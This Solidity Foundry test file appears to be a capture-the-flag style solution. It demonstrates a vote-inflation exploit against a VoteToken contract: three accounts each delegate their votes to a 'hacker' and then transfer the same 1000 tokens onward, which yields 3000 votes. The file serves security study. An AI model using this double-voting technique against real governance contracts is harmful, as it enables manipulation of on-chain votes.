// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import "forge-std/Test.sol";
import "../VotingMachine.sol";

contract exploitTest is Test {
    VoteToken vToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carl = address(3);

    function setUp() public {
        vm.startPrank(owner);
        vToken = new VoteToken();
        vToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploit() public {
        // Because Hacker posses private keys of Alice, Bob, Carl, he has full access to their accounts
        // and funds

        emit log_named_uint("Alice vToken balance", vToken.balanceOf(alice));
        emit log_named_uint("Votes hacker", vToken.getVotes(hacker));

        // Votes are converted from vTokens balance of msg.sender (line 75 in VotingMachine.sol)
        // After the delegation simply transfer all tokens to next account. Repeat the process
        vm.startPrank(alice);
        vToken.delegate(hacker);
        vToken.transfer(bob, vToken.balanceOf(alice));
        vm.stopPrank();

        emit log_named_uint(
            "Bob vToken balance after transfer from Alice",
            vToken.balanceOf(bob)
        );
        emit log_named_uint(
            "Votes hacker after delegate from Alice",
            vToken.getVotes(hacker)
        );

        vm.startPrank(bob);
        vToken.delegate(hacker);
        vToken.transfer(carl, vToken.balanceOf(bob));
        vm.stopPrank();

        emit log_named_uint(
            "Carl vToken balance after transfer from Bob",
            vToken.balanceOf(carl)
        );
        emit log_named_uint(
            "Votes hacker after delegate from Bob",
            vToken.getVotes(hacker)
        );

        vm.startPrank(carl);
        vToken.delegate(hacker);
        vToken.transfer(hacker, vToken.balanceOf(carl));
        vm.stopPrank();

        uint hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint hacker_balance = vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 3000);
        assertEq(hacker_balance, 1000);
    }
}
